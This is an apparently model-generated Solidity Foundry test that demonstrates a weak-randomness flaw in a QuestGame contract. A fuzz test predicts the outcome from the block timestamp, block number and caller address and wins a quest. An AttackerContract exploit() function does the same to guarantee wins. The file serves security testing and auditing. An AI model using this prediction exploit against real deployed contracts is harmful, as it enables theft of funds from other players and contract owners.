// Generation Time: 16,91s
// Input Tokens: 2233
// Output Tokens: 1455
// Reasoning Tokens: 0

// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {QuestGame} from "../src/QuestGame.sol";

contract TestWeakRandomnessQuestGame is Test {

    QuestGame public questGame;
    address public attacker;

    function setUp() public {
        vm.deal(address(this), 10 ether);
        questGame = new QuestGame{value: 5 ether}();
        attacker = makeAddr("attacker");
        vm.deal(attacker, 10 ether);
    }

    function test_highlightPredictableRandomValue(uint256 blockTimestamp, uint256 blockNumber) public {
        
        // Constrain the inferred symbolic variables
        blockTimestamp = bound(blockTimestamp, 1, type(uint128).max);
        blockNumber = bound(blockNumber, 1, type(uint128).max);

        // Manipulate block environment
        vm.warp(blockTimestamp);
        vm.roll(blockNumber);

        // Predict the outcome by replicating the vulnerable logic
        uint256 predictedSeed = uint256(
            keccak256(
                abi.encodePacked(
                    block.timestamp,
                    block.number,
                    attacker
                )
            )
        );
        uint256 predictedNumber = predictedSeed % 100;

        // Record attacker's initial stats
        (uint256 expBefore, uint256 winsBefore) = questGame.getPlayerStats(attacker);

        // Execute the attack: attacker calls attemptQuest with the predicted number
        vm.prank(attacker);
        questGame.attemptQuest{value: 0.1 ether}(predictedNumber);

        // Get attacker's stats after the attempt
        (uint256 expAfter, uint256 winsAfter) = questGame.getPlayerStats(attacker);

        // Assert predictability: the attacker should have won because they predicted the number
        assertEq(winsAfter, winsBefore + 1, "Attacker should have won by predicting the random number");
        assertEq(expAfter, expBefore + 100, "Attacker should have gained 100 experience");
    }

    receive() external payable {}
}

contract AttackerContract {
    QuestGame public questGame;

    constructor(address _questGame) {
        questGame = QuestGame(payable(_questGame));
    }

    function exploit() external {
        // Calculate the exact "random" number that will be generated
        uint256 seed = uint256(
            keccak256(
                abi.encodePacked(
                    block.timestamp,
                    block.number,
                    address(this)
                )
            )
        );
        uint256 predictedNumber = seed % 100;

        // Call attemptQuest with the predicted number to guarantee a win
        questGame.attemptQuest{value: 0.1 ether}(predictedNumber);
    }

    receive() external payable {}
}
